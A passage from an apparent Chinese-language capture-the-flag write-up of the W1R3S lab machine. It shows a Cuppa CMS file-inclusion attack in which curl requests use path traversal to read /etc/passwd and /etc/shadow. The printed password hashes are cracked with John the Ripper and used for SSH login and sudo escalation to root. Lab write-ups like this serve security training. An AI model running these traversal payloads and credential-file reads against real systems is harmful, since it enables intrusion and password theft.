</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;content_alert_config&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;content_alert_config&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=cp>&lt;?php include &#34;../components/table_manager/fields/config/&#34;.@$cuppa-&gt;POST(&#34;urlConfig&#34;); ?&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span> 
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>仔细看，这里的 <code>urlConfig</code> 变成通过 <code>POST</code> 的方式进行参数传递，且参数未校正，从而触发了这个文件包含漏洞。</p>
<p>使用 <code>POST</code> 的方式发个请求试试，在这里我使用 <code>curl</code> 的 <code>--data-urlencode</code> 参数来处理 <code>POST</code> 请求：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl --help all <span class=p>|</span> grep url                 
</span></span><span class=line><span class=cl>Usage: curl <span class=o>[</span>options...<span class=o>]</span> &lt;url&gt;
</span></span><span class=line><span class=cl>     --data-urlencode &lt;data&gt; HTTP POST data URL encoded
</span></span><span class=line><span class=cl> -q, --disable     Disable .curlrc
</span></span><span class=line><span class=cl>     --disallow-username-in-url Disallow username in URL
</span></span><span class=line><span class=cl>     --doh-url &lt;URL&gt; Resolve host names over DoH
</span></span><span class=line><span class=cl>     --libcurl &lt;file&gt; Dump libcurl equivalent code of this <span class=nb>command</span> line
</span></span><span class=line><span class=cl>     --url &lt;url&gt;   URL to work with
</span></span><span class=line><span class=cl>     --url-query &lt;data&gt; Add a URL query part
</span></span><span class=line><span class=cl>                                                                                                                                                                                            
</span></span><span class=line><span class=cl>$ curl --data-urlencode <span class=s1>&#39;urlConfig=../../../../../../../../../etc/passwd&#39;</span> http://10.10.10.130/administrator/alerts/alertConfigField.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span></span><span class=line><span class=cl>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span></span><span class=line><span class=cl>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span></span><span class=line><span class=cl>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span></span><span class=line><span class=cl>syslog:x:104:108::/home/syslog:/bin/false
</span></span><span class=line><span class=cl>_apt:x:105:65534::/nonexistent:/bin/false
</span></span><span class=line><span class=cl>messagebus:x:106:110::/var/run/dbus:/bin/false
</span></span><span class=line><span class=cl>uuidd:x:107:111::/run/uuidd:/bin/false
</span></span><span class=line><span class=cl>lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
</span></span><span class=line><span class=cl>whoopsie:x:109:117::/nonexistent:/bin/false
</span></span><span class=line><span class=cl>avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
</span></span><span class=line><span class=cl>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
</span></span><span class=line><span class=cl>dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
</span></span><span class=line><span class=cl>colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span></span><span class=line><span class=cl>speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
</span></span><span class=line><span class=cl>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
</span></span><span class=line><span class=cl>kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
</span></span><span class=line><span class=cl>pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
</span></span><span class=line><span class=cl>rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
</span></span><span class=line><span class=cl>saned:x:119:127::/var/lib/saned:/bin/false
</span></span><span class=line><span class=cl>usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
</span></span><span class=line><span class=cl>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
</span></span><span class=line><span class=cl>sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
</span></span><span class=line><span class=cl>mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>这里的回显已 <code>:</code> 符号做为分隔符第二个参数都是 <code>x</code> 表明密码是以哈希的方式保存在 <code>shadow</code> 里面的，再次构造一次 <code>POST</code>：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl --data-urlencode <span class=s1>&#39;urlConfig=../../../../../../../../../etc/shadow&#39;</span> http://10.10.10.130/administrator/alerts/alertConfigField.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root:<span class=nv>$6$vYcecPCy$JNbK</span>.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
</span></span><span class=line><span class=cl>daemon:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>bin:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>sys:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>sync:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>games:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>man:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>lp:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>mail:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>news:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>uucp:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>proxy:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>www-data:<span class=nv>$6$8</span>JMxE7l0<span class=nv>$yQ16jM</span>..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
</span></span><span class=line><span class=cl>backup:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>list:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>irc:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>gnats:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>nobody:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-timesync:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-network:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-resolve:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-bus-proxy:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>syslog:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>_apt:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>messagebus:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>uuidd:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>lightdm:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>whoopsie:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>avahi-autoipd:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>avahi:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>dnsmasq:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>colord:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>speech-dispatcher:!:17379:0:99999:7:::
</span></span><span class=line><span class=cl>hplip:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>kernoops:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>pulse:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>rtkit:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>saned:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>usbmux:*:17379:0:99999:7:::
</span></span><span class=line><span class=cl>w1r3s:<span class=nv>$6$xe</span>/eyoTx<span class=nv>$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:17567:0:99999:7:::
</span></span><span class=line><span class=cl>sshd:*:17554:0:99999:7:::
</span></span><span class=line><span class=cl>ftp:*:17554:0:99999:7:::
</span></span><span class=line><span class=cl>mysql:!:17554:0:99999:7:::
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>然后将这些哈希拿下来进行破解：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;&#39;&#39;root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=s1>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=s1>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span> &gt; shadow.bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ john shadow.bash 
</span></span><span class=line><span class=cl>Warning: detected <span class=nb>hash</span> <span class=nb>type</span> <span class=s2>&#34;sha512crypt&#34;</span>, but the string is also recognized as <span class=s2>&#34;HMAC-SHA256&#34;</span>
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--format=HMAC-SHA256&#34;</span> option to force loading these as that <span class=nb>type</span> instead
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>3</span> password hashes with <span class=m>3</span> different salts <span class=o>(</span>sha512crypt, crypt<span class=o>(</span>3<span class=o>)</span> <span class=nv>$6</span>$ <span class=o>[</span>SHA512 128/128 AVX 2x<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>5000</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Proceeding with single, rules:Single
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>www-data         <span class=o>(</span>www-data<span class=o>)</span>   
</span></span><span class=line><span class=cl>Almost <span class=k>done</span>: Processing the remaining buffered candidate passwords, <span class=k>if</span> any.
</span></span><span class=line><span class=cl>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span class=line><span class=cl>computer         <span class=o>(</span>w1r3s<span class=o>)</span>   
</span></span><span class=line><span class=cl>Proceeding with incremental:ASCII
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>john</code> 已经破解出来了两个账号，<code>root</code> 破解时间太长了，试试直接登录 <code>w1r3s</code> 这个账号试试看。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh -lw1r3s 10.10.10.130 /bin/bash
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>Think this is the way?
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>Well,........possibly.
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>w1r3s@10.10.10.130 password: 
</span></span><span class=line><span class=cl>^C
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>隐秘登录失败，正常登录有回显。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh w1r3s@10.10.10.130          
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>Think this is the way?
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>Well,........possibly.
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>w1r3s@10.10.10.130 password: 
</span></span><span class=line><span class=cl>Welcome to Ubuntu 16.04.3 LTS <span class=o>(</span>GNU/Linux 4.13.0-36-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>108</span> packages can be updated.
</span></span><span class=line><span class=cl><span class=m>6</span> updates are security updates.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.....You made it huh?....
</span></span><span class=line><span class=cl>Last login: Mon Jan <span class=m>22</span> 22:47:27 <span class=m>2018</span> from 192.168.0.35
</span></span><span class=line><span class=cl>w1r3s@W1R3S:~$ 
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>看看当前账号的权限。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>w1r3s@W1R3S:~$ whoami
</span></span><span class=line><span class=cl>w1r3s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>w1r3s@W1R3S:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>w1r3s<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>w1r3s<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>w1r3s<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,113<span class=o>(</span>lpadmin<span class=o>)</span>,128<span class=o>(</span>sambashare<span class=o>)</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>注意看这个账号 <code>groups</code> 组里面有 <code>27(sudo)</code> 的权限，接着看看这个账号有什么权限。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>w1r3s@W1R3S:~$ uname -a 
</span></span><span class=line><span class=cl>Linux W1R3S 4.13.0-36-generic <span class=c1>#40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>w1r3s@W1R3S:~$ sudo -l
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> w1r3s: 
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> w1r3s on W1R3S.localdomain:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User w1r3s may run the following commands on W1R3S.localdomain:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL : ALL<span class=o>)</span> ALL
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>(ALL : ALL) ALL</code> 这里也就是这个账号有全部权限，那就相当于是 <code>root</code> 了，简单提权一下。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>w1r3s@W1R3S:~$ sudo /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@W1R3S:~# whoami
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@W1R3S:~# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@W1R3S:~# uname -a
</span></span><span class=line><span class=cl>Linux W1R3S 4.13.0-36-generic <span class=c1>#40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@W1R3S:~# <span class=nb>cd</span> /root
</span></span><span class=line><span class=cl>root@W1R3S:/root# cat flag.txt
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
</span></span><span class=line><span class=cl>  / ___/ _ <span class=se>\|</span> <span class=se>\ </span><span class=p>|</span> <span class=p>|</span>/ ___<span class=p>|</span>  _ <span class=se>\ </span>   / <span class=se>\|</span>_   _<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>      / <span class=se>\|</span>_   _<span class=p>|</span>_ _/ _ <span class=se>\|</span> <span class=se>\ </span><span class=p>|</span> / ___<span class=p>|</span> 
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>  <span class=se>\|</span> <span class=p>|</span> <span class=p>|</span>  _<span class=p>|</span> <span class=p>|</span>_<span class=o>)</span> <span class=p>|</span>  / _ <span class=se>\ </span><span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>     / _ <span class=se>\ </span><span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>  <span class=se>\|</span> <span class=se>\_</span>__ <span class=se>\ </span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=p>|</span>__<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span> <span class=p>|</span><span class=se>\ </span> <span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>  _ &lt;  / ___ <span class=se>\|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span> <span class=p>|</span>___ / ___ <span class=se>\|</span> <span class=p>|</span>  <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span> <span class=p>|</span><span class=se>\ </span> <span class=p>|</span>___<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>  <span class=se>\_</span>___<span class=se>\_</span>__/<span class=p>|</span>_<span class=p>|</span> <span class=se>\_</span><span class=p>|</span><span class=se>\_</span>___<span class=p>|</span>_<span class=p>|</span> <span class=se>\_\/</span>_/   <span class=se>\_\_</span><span class=p>|</span>  <span class=se>\_</span>__/<span class=p>|</span>_____/_/   <span class=se>\_\_</span><span class=p>|</span> <span class=p>|</span>___<span class=se>\_</span>__/<span class=p>|</span>_<span class=p>|</span> <span class=se>\_</span><span class=p>|</span>____/ 
</span></span><span class=line><span class=cl>                                                                                    
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                          .-----------------TTTT_-----_______
</span></span><span class=line><span class=cl>                        /<span class=s1>&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;</span><span class=o>(</span>______O<span class=o>]</span> ----------____  <span class=se>\_</span>_____/<span class=o>]</span>_
</span></span><span class=line><span class=cl>     __...---<span class=s1>&#39;&#34;&#34;&#34;\_ --&#39;&#39;   Q                               ___________@
</span></span></span><span class=line><span class=cl><span class=s1> |&#39;&#39;&#39;</span>                   ._   <span class=nv>_______________</span><span class=o>=</span>---------<span class=s2>&#34;&#34;&#34;&#34;&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2> |                ..--&#39;&#39;|   l L |_l   |
</span></span></span><span class=line><span class=cl><span class=s2> |          ..--&#39;&#39;      .  /-___j &#39;   &#39;
</span></span></span><span class=line><span class=cl><span class=s2> |    ..--&#39;&#39;           /  ,       &#39;   &#39;
</span></span></span><span class=line><span class=cl><span class=s2> |--&#39;&#39;                /           `    \
</span></span></span><span class=line><span class=cl><span class=s2>                      L__&#39;         \    -
</span></span></span><span class=line><span class=cl><span class=s2>                                    -    &#39;-.
</span></span></span><span class=line><span class=cl><span class=s2>                                     &#39;.    /
</span></span></span><span class=line><span class=cl><span class=s2>                                       &#39;-./
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>----------------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=s2>  YOU HAVE COMPLETED THE
</span></span></span><span class=line><span class=cl><span class=s2>               __      __  ______________________   _________
</span></span></span><span class=line><span class=cl><span class=s2>              /  \    /  \/_   \______   \_____  \ /   _____/
